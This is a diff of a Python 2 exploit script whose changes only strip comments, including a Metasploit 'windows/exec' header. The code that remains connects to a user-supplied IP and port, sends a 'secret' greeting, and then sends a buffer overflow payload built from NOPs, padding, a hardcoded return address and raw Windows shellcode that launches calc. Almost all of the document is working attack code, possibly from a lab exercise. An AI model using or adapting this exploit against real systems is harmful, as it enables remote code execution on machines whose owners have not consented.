@@ -2,12 +2,6 @@
 
 import socket, sys, struct
 
-'''
- * windows/exec - 196 bytes
- * http://www.metasploit.com
- * VERBOSE=false, EXITFUNC=process, CMD=calc
- */
-'''
 shellcode = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"\
 "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"\
 "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"\
@@ -23,7 +17,6 @@ shellcode = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"\
 "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"\
 "\x00";
 
-
 if len(sys.argv) != 3:
 	print "supply IP PORT"
 	sys.exit(-1)
@@ -31,15 +24,12 @@ if len(sys.argv) != 3:
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect( (sys.argv[1], int(sys.argv[2])) )
 
-###send
 message = "secret\n\x00"
 sock.sendall(message)
 
-###recieve
 data = sock.recv(10000)
 print data
 
-###send
 ret_addr=0x6E95762B
 breakpoint = ""
 ret_addr_s=struct.pack('L', 0x6E95762B)
@@ -53,6 +43,5 @@ exploit += ret_addr_s
 print("NOPS=%d, shellcode=%d, pad=%d, ret_addr=%x\n" % (nops_len, len(shellcode), len(pad), ret_addr ) )
 sock.sendall(exploit)
 
-###recieve
 data = sock.recv(10000)
 print data
